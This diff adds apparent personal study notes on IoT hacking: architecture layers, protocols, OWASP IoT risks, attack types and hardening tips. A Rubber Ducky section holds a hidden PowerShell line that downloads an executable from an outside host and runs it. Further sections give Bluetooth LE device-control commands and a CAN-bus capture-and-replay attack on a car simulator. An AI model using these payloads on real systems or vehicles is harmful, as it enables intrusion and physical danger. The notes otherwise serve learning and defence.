@@ -1,0 +1,216 @@
+IOT devices helps you connect directly to the internet using wired or wireless connection
+
+IOT 5 layer architecture--
+1.Application layer
+Delivers the data to the user
+Allows the user to control the device and manage IOT device
+
+
+
+2.Middleware Layer
+Device and information management
+Provides a connectivity layer that enables effective communication
+
+
+
+3.Internet Layer
+Responsible for endpoint connectivity
+Converts and transfers data
+Allow compatability between different networks(eg-3g,lan,bluetooth etc.)
+
+
+
+4.Access gateway layer
+Protocol translation and messaging
+Centralizes communications and collects data efficiently
+Transports data from multiple devices and applications
+
+
+5.Edge Technology Layer
+Covers Iot capable devices
+Represent the endpoint
+Used to connect to the IOT device
+eg-smartphone used to interact with an IOT device
+
+
+#IOT technologies and protocols--
+HaLow(Medium range)---Works on frequency just below 1ghz.Offers long range and power efficient with applications ranging from smart homes,connected cars,healthcare
+LTE advanced(medium range)--used by mobile carriers uner 4g networks and faster than regular LTE and download speed upto 300mbps,upload to 70mbps. After this we will have LTE pro under 5g networks
+
+LPWAN(Low power-wide area networking)(Long range)--Preferred choice for IOT applications
+VSAT(Very small aperture terminal)(Long range)--Used in satellite communication for both home and business users
+
+
+//ARM embedded OS(OS)--standard OS for IOT devices
+
+
+
+#IOT communication models--
+Device to device Model-Two devices communicate with each other without interferring any other device. Mobile phone and wireless printer
+Device to cloud model--IOT devices are directly connected to the application server hosted in the cloud.eg-multiple cctv,smoke detectors are connected to the application server hosted in the cloud
+Device to gateway model--same as Device-cloud model but the difference is that the data goes through Gateway
+Back-end data sharing model--Advanced model
+
+
+#Challenges of IOT
+1.Lack of Security(Lack of encryption,hardcoded credentials)
+2.Vulnerable interfaces(webapps,APIs)
+3.Inefficient physical security protections(install backdoors,firmware can be replaced)
+4.Insufficient vendor support
+5.Lack of inefficent firmware and OS updates
+
+
+#OWASP top 10 vulnerabilites of IOT
+1.Weak,guessable or hardcoded passwords--easily brute force passwords,passwords stored in plain text
+2.Insecure network services--ports that are not being used are still open
+3.Insecure ecosystem interfaces--insecure web,api,cloud,mobile device
+4.Lack of secure update--Firmware validation,missing notification of security updates,insecure libraries andcomponents,third-party
+5.Insufficient privacy protections-Personally indentifiable information(PII) stored insecurely,without permissions
+6.Insecure data transfer and storage-no proper encryption,Poor access control,sensitive data not protected
+7.Lack of device management--asset management,update management,system monitoring
+8.Insecure default settings--default passwords,default configurations
+9.Lack of physical hardening-No secure locations
+
+
+#IOT attack areas
+1.Device memory containing credentials
+2.Access control-restricting access to system
+3.Privelege escalation
+4.Resetting device to an insecure state so that we can attack it
+5.Web attacks
+6.Firmware attacks
+7.Network service attacks
+8.Unencrypted local data storage
+9.Cloud computing attacks
+10.Malicious update
+11.Insecure APIs
+12.Mobile application threats
+
+
+#IOT attacks
+1.DDOS attacks-IOT devices,application server,gateway,cloud services--ports
+2.Rolling code attacks--used in car doors and garage doors.Attacker records the traffic and then replay it again to unlock it
+"HackRF tool"
+3.Blueborne attack-exploiting buletooth vulnerabilites.This allows attacker to gain access even without pairing with the device or to set the bluetooth in a discoverable mode
+4.Jamming attack--jamming the signals to prevent devices to communicate with each other
+5.Backdoor
+6.Eavesdropping
+7.Man in the middle attack
+8.Exploit kits
+9.Ransomware attack
+
+
+#IOT hacking methodology--same as in the other platforms
+1.Information Gathering--Ip address,device information,open ports,runinng protocols,vendor info and resources like shodan,censys,thingful etc.
+2.Vulnerability scanning--nmap,RIot,Nessus,Qualys,nexpose
+3.Launch attack--Rolling code,RFCrack,Attify zigbee framework,HackRF One
+4.Gaining access
+5.Maintaining access
+
+#Hacking IOT--
+Attify OS 				//distro for IOT pentesting
+Hcitool					//bluetooth information gathering tool
+>>>Concept is the same as that in the car hacking..Replay attack <<<<
+Gatttool					//tool to exploit the device'
+
+#Commands
+hciconfig 								//Mac address of the device(bluetooth dongle should be connected) 
+sudo hcitool lescan						//Get the information of the bluetooth devices available nearby
+gatttool -I -b [bluetooth address]		//Connecting with the bluetooth device									
+and then "connect"						//to connect to the device
+and then pass the analyzed traffic to change the color of the bulb
+
+
+#Securing IOT devices--
+1.Firmware Update
+2.Block Unused ports
+3.Disable unused network services
+4.Use encrypted TLS communication
+5.Use strong passwords
+6.Use encryption on your drivers(on your driver,firmware)
+7.Use account lockout on x no. of failure
+8.Periodic assessment of devices
+9.Secure password recovery
+10.Two factor authentication
+11.Disable Insecure UPnp(universal plug and play services)
+12.Secure harware..disable all debugging ports like UART,JTAG,GPIO
+
+
+
+
+**********************************************************************
+#Extra
+GAP--Generic access profile--Controls conenctions and advertising in bluetooth.This helps in making devices visible,determines how two device can or can't interact with each other
+GATT-Generic Attribute profile--Determines how two bluetooth devices transfer data using concept called "services" and "characteristics"
+
+
+##References--
+IOT hackers handbook (book)
+IOT penetration testing cookbook (book) 
+IOt security foundation
+NIST IOT
+OWASP IOT
+Cloud security alliance IOt Controls
+
+
+##Scripting in arduino
+To script in the arduino we can use "seytonic.com/ducky"..Here we need to go for typing anything in notepad
+DELAY 100
+GUI
+DELAY 100
+LEAFPAD
+DELAY 100
+STRING "THIS IS TEXT"							//Here we can 
+
+
+To upload the file on the server and download it as soon as the pen drive is injected 
+
+DELAY 1500
+GUI r
+DELAY 500 
+STRING powershell -windowstyle hidden (new-object System.Net.WebClient).DownloadFile('https://phmcsecurities.org/s.exe','%TEMP%\s.exe'); Start-Process "%TEMP%\s.exe"
+ENTER
+
+
+
+
+Car Hacking---(Replay attack)
+Simulator---opengarages.org			//instrument cluster simulator
+We connect to car using onboard diagonostic port (red cable)			--CAN USB cable
+
+Installing the CAN utils--
+apt-get install libsdl2-dev
+sudo rm /var/lib/dpkg/lock							//in case the error occurs "another process is using it"
+apt-get install systemd								//If there is a problem of "PkgProblemResolver"
+
+apt-get install libsdl2-image-dev					//cool graphics dashboard on IC simulator
+apt-get install can-utils							//installing the controller network utils
+git clone https://github.com/zombieCrag/ICSim.git			//installing the IC sim. and running it
+
+
+Setting up the Virtual CAN network---
+modprobe vcan
+dmesg		//helps to see the kernel messages..used for verifying that what we have provided the command is executing 	or not
+ip link add dev vcan0 type vcan				//adding a device named vcan0
+ip link set up vcan0						//device set up and ready to use
+cansniffer -c vcan0							//sniffing the packets (terminal)
+./icsim vcan0								//opening the simulator (terminal)
+./controls vcan0							//opening the controller (terminal)
+
+
+****In replay attack we capture the packets after getting all the functions executed of the car and then save it in a log file and attacking on another car using that log file and get all the functions executed****
+
+candump -l vcan0							//logging all the traffic on the vcan0 interface
+canplayer -I candump-2017.log			//replaying the attack and providing the log file as input
+****We can use it in the actual car in the same way by capturing packets and replaying it again****
+
+
+
+
+Hacking the car hacking software---
+We can change the code of the software which we are using it to hack the car.
+We can change the MAX-Speed and also the acceleration of the car in the "controls.c" file\
+Open the terminal pass "make" command
+If there is any error while passing this command---gcc -g -O -c lib.c	//gcc editor of c file this will update the lib.o file 	
+
+#ends
